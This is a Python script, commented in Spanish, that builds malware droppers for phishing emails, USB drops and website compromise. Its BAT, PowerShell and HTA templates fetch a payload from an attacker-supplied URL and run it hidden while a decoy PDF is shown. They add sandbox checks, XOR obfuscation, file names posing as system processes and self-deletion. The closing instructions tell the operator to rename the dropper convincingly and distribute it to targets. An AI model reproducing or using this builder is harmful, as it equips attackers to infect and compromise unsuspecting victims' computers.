#!/usr/bin/env python3
"""
========================================================================
BUILDER - Generador Automático de Droppers Personalizados
========================================================================
Este script genera droppers personalizados para diferentes escenarios:
- Phishing por email
- USB drop attacks
- Compromiso de sitios web

CARACTERÍSTICAS:
- XOR encryption del payload
- Múltiples formatos (BAT, PS1, LNK, HTA)
- Iconos personalizados
- Anti-sandbox integrado
- Ofuscación automática

USO:
    python builder.py --agent agent.exe --output ticket.pdf.bat --type bat
    python builder.py --agent agent.exe --output factura.lnk --type lnk --icon pdf
    python builder.py --agent agent.exe --output documento.hta --type hta --decoy factura.pdf

DEPENDENCIAS:
    pip install pyinstaller (para compilar EXE droppers)
========================================================================
"""

import argparse
import base64
import os
import random
import string
import sys
from pathlib import Path

# === TEMPLATES ===

BAT_TEMPLATE = '''@echo off
REM Dropper generado automáticamente
set "payload_url={payload_url}"
set "payload_path=%APPDATA%\\Microsoft\\Windows\\Caches\\{random_name}.exe"
set "decoy_path=%TEMP%\\{decoy_name}"

REM Crear PDF decoy
echo %%PDF-1.4 > "%decoy_path%"
echo 1 0 obj ^<^< /Type /Catalog /Pages 2 0 R ^>^> endobj >> "%decoy_path%"
echo %%%%EOF >> "%decoy_path%"

REM Abrir decoy
start "" "%decoy_path%"

REM Descargar y ejecutar payload
timeout /t 2 /nobreak >nul
powershell -NoProfile -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('%payload_url%','%payload_path%');Start-Process '%payload_path%' -WindowStyle Hidden"

REM Autodestrucción
(goto) 2>nul & del "%~f0"
'''

PS1_TEMPLATE = '''# Dropper PowerShell Ofuscado
$p="{payload_b64}"
$d="{decoy_url}"
$k="{xor_key}"
$o="$env:APPDATA\\Microsoft\\Windows\\Caches\\{random_name}.exe"

# Anti-Sandbox: Verificar RAM
if((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB){{exit}}

# Decodificar payload
$b=[Convert]::FromBase64String($p)
$kb=[Text.Encoding]::UTF8.GetBytes($k)
$r=New-Object byte[] $b.Length
for($i=0;$i -lt $b.Length;$i++){{$r[$i]=$b[$i] -bxor $kb[$i%$kb.Length]}}

# Escribir y ejecutar
[IO.File]::WriteAllBytes($o,$r)
Start-Process $o -WindowStyle Hidden

# Abrir decoy
Start-Process $d
'''

HTA_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
<title>Cargando documento...</title>
<HTA:APPLICATION 
    APPLICATIONNAME="DocumentViewer"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
/>
<style>
body {{
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}}
.loader {{
    text-align: center;
    color: white;
}}
.spinner {{
    border: 4px solid #f3f3f3;
    border-top: 4px solid #667eea;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
}}
@keyframes spin {{
    0% {{ transform: rotate(0deg); }}
    100% {{ transform: rotate(360deg); }}
}}
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <h2>Cargando documento...</h2>
    <p>Por favor espere...</p>
</div>

<script type="text/vbscript">
Sub Window_OnLoad
    ' Descargar y ejecutar payload
    Set objShell = CreateObject("WScript.Shell")
    Set objHTTP = CreateObject("Microsoft.XMLHTTP")
    
    ' Download payload
    payloadURL = "{payload_url}"
    savePath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\Caches\\{random_name}.exe"
    
    objHTTP.Open "GET", payloadURL, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile savePath, 2
        objStream.Close
        
        ' Ejecutar payload
        objShell.Run savePath, 0, False
    End If
    
    ' Abrir documento decoy
    objShell.Run "{decoy_url}", 1, False
    
    ' Cerrar HTA
    Window.Close
End Sub
</script>
</body>
</html>
'''

def generate_random_name(length=8):
    """Genera nombre aleatorio para archivos"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def xor_encrypt(data, key):
    """Encripta datos con XOR"""
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def build_bat_dropper(agent_path, output_path, payload_url, decoy_name=None):
    """Genera dropper BAT"""
    if decoy_name is None:
        decoy_name = f"documento_{generate_random_name()}.pdf"
    
    random_name = f"WmiPrvSE_{generate_random_name()}"
    
    dropper_code = BAT_TEMPLATE.format(
        payload_url=payload_url,
        random_name=random_name,
        decoy_name=decoy_name
    )
    
    with open(output_path, 'w') as f:
        f.write(dropper_code)
    
    print(f"[+] Dropper BAT generado: {output_path}")
    print(f"[*] Renombrar a algo convincente, ejemplo: 'Factura_2024.pdf.bat'")

def build_ps1_dropper(agent_path, output_path, decoy_url, xor_key=None):
    """Genera dropper PowerShell"""
    if xor_key is None:
        xor_key = generate_random_name(16)
    
    # Leer y encriptar payload
    with open(agent_path, 'rb') as f:
        payload_bytes = f.read()
    
    encrypted = xor_encrypt(payload_bytes, xor_key)
    payload_b64 = base64.b64encode(encrypted).decode()
    
    random_name = f"conhost_{generate_random_name()}"
    
    dropper_code = PS1_TEMPLATE.format(
        payload_b64=payload_b64,
        decoy_url=decoy_url,
        xor_key=xor_key,
        random_name=random_name
    )
    
    with open(output_path, 'w') as f:
        f.write(dropper_code)
    
    print(f"[+] Dropper PowerShell generado: {output_path}")
    print(f"[*] XOR Key: {xor_key}")

def build_hta_dropper(agent_path, output_path, payload_url, decoy_url):
    """Genera dropper HTA"""
    random_name = f"msedge_{generate_random_name()}"
    
    dropper_code = HTA_TEMPLATE.format(
        payload_url=payload_url,
        decoy_url=decoy_url,
        random_name=random_name
    )
    
    with open(output_path, 'w') as f:
        f.write(dropper_code)
    
    print(f"[+] Dropper HTA generado: {output_path}")
    print(f"[*] Usar en phishing emails como adjunto")

def main():
    parser = argparse.ArgumentParser(description='Generador de Droppers Personalizados')
    parser.add_argument('--agent', required=True, help='Ruta al agent.exe')
    parser.add_argument('--output', required=True, help='Archivo de salida del dropper')
    parser.add_argument('--type', choices=['bat', 'ps1', 'hta'], default='bat', help='Tipo de dropper')
    parser.add_argument('--url', help='URL donde hostear el payload (para BAT/HTA)')
    parser.add_argument('--decoy', help='URL o archivo del documento decoy')
    parser.add_argument('--key', help='Clave XOR para encripción (solo PS1)')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.agent):
        print(f"[!] Error: No se encontró {args.agent}")
        sys.exit(1)
    
    print(f"[*] Generando dropper tipo: {args.type}")
    print(f"[*] Payload: {args.agent}")
    print(f"[*] Output: {args.output}")
    
    if args.type == 'bat':
        if not args.url:
            print("[!] Error: --url requerido para BAT dropper")
            sys.exit(1)
        build_bat_dropper(args.agent, args.output, args.url, args.decoy)
    
    elif args.type == 'ps1':
        decoy_url = args.decoy or "https://www.google.com"
        build_ps1_dropper(args.agent, args.output, decoy_url, args.key)
    
    elif args.type == 'hta':
        if not args.url:
            print("[!] Error: --url requerido para HTA dropper")
            sys.exit(1)
        decoy_url = args.decoy or "https://www.google.com"
        build_hta_dropper(args.agent, args.output, args.url, decoy_url)
    
    print("\n[*] Próximos pasos:")
    print("    1. Hostear el agent.exe en servidor web")
    print("    2. Renombrar dropper a nombre convincente")
    print("    3. Cambiar icono si es necesario")
    print("    4. Probar en VM antes de distribución")
    print(f"    5. Distribuir {args.output} a objetivos")

if __name__ == '__main__':
    main()
